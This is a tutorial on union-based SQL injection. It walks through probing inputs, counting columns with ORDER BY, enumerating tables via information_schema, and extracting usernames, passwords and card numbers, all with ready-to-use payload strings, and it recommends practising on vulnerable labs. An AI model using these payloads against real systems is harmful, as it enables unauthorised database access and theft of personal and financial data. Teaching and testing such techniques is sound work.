
Union-Based SQL Injection is a **type of SQL injection attack** that exploits the **UNION operator** in SQL queries. It allows an attacker to **combine results from multiple SELECT statements** into a single result set.

* **Why it matters:**

  * Attackers can retrieve sensitive data from other tables.
  * It can expose confidential information like usernames, passwords, and credit card numbers.
  * It works only if the application **fails to properly validate or sanitize user input**.

---

## **1. How Union-Based SQL Injection Works**

**Key points:**

1. The **UNION operator** in SQL combines results of two or more SELECT statements.
2. The **number of columns and their data types must match** between the original query and the injected query.
3. An attacker injects additional SELECT statements to retrieve **data from other tables**.

---

### **Example Scenario**

**Vulnerable query in the application:**

```sql
SELECT id, name FROM users WHERE id = '<user_input>'
```

**Attacker payload:**

```sql
' UNION SELECT credit_card_number, 'hack' FROM credit_cards --
```

* **What happens:**

  * The original query is modified to:

    ```sql
    SELECT id, name FROM users WHERE id = '' UNION SELECT credit_card_number, 'hack' FROM credit_cards --
    ```
  * The `--` comments out the rest of the original query.
  * The database returns results **from both queries**: the original `users` table plus `credit_card_number` from `credit_cards`.

**Example Output:**

```
id   | name
-----|------
1    | admin
2    | john
3    | 1234-5678-9876-5432  (from credit_cards)
```

---

## **2. Methodology for Union-Based SQL Injection**

### **Step 1: Identify User Inputs**

Look for inputs that go directly into SQL queries:

* URL parameters: `http://example.com/item.php?id=1`
* Form fields: login, search, registration
* Cookies or headers
* Hidden form fields

**Tip:** Focus on inputs that appear in **database-driven pages**.

---

### **Step 2: Test Inputs for Vulnerability**

* Inject simple test characters to see if the input is vulnerable:

```sql
'
"
```

* Observe the response:

  * If the application **shows an error** like `You have an error in your SQL syntax`, it’s likely vulnerable.
  * If the page behaves unexpectedly (e.g., missing content, different layout), that’s also a clue.

---

### **Step 3: Identify Vulnerable Injection Points**

* Inject simple **UNION SELECT** statements to test the response:

```sql
' UNION SELECT 1,2 --
```

* **Tips:**

  * Use **ORDER BY** to determine the number of columns:

    ```sql
    ' ORDER BY 1 --  
    ' ORDER BY 2 --  
    ```

    * The page breaks when the column number exceeds the actual columns.
  * Once you know the column count, construct a **matching UNION SELECT** query.

---

### **Step 4: Confirm Vulnerability**

* Inject a **UNION SELECT** with test data to see which columns are displayed:

```sql
' UNION SELECT 'A','B' --
```

* The output tells you which columns are **visible on the webpage**. Only these columns can be used to extract sensitive data.

---

### **Step 5: Enumerate the Database**

* Once confirmed, use **UNION SELECT** to explore database structure:

**Examples:**

1. List table names:

```sql
' UNION SELECT table_name, 'x' FROM information_schema.tables WHERE table_schema=database() --
```

2. List columns in a specific table:

```sql
' UNION SELECT column_name, 'x' FROM information_schema.columns WHERE table_name='users' --
```

3. Extract data:

```sql
' UNION SELECT username, password FROM users --
```

* **Tips:**

  * Use **LIMIT** to extract one row at a time if the page cannot display all results.
  * Use **ORDER BY** to enumerate columns systematically.

---

### **Extra Notes and Tips**

1. **Column count & data types:**

   * UNION SELECT queries fail if the **number of columns or data types** do not match.
   * Use `NULL` for unknown columns:

     ```sql
     ' UNION SELECT NULL, username, password FROM users --
     ```

2. **Comments:**

   * Use `--` or `#` to comment out the rest of the query:

     ```sql
     ' UNION SELECT username,password FROM users -- 
     ```

3. **Combination with other SQLi types:**

   * Error-Based SQLi can be used first to **discover table/column names**, then UNION-Based SQLi extracts data.

4. **Testing safely:**

   * Always test on **vulnerable labs** like **DVWA**, **Mutillidae**, **bWAPP**, or **HackTheBox labs**.

---
